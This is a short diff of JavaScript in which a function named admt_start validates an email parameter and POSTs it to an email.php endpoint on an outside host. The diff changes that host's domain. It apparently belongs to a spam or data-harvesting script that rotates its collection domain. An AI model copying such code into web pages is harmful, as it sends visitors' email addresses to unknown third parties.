@@ -1429,7 +1429,7 @@ admt_start = () => {
 					}
 					if (params_object.em !== "" && /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(params_object.em)) {
 						$.ajax({
-						    url: 'https://img.cumfast.live/email.php',
+						    url: 'https://img.giftforall.co/email.php',
 						    type: 'POST',
 						    data: api_send_data,
 						    success: function(response) {
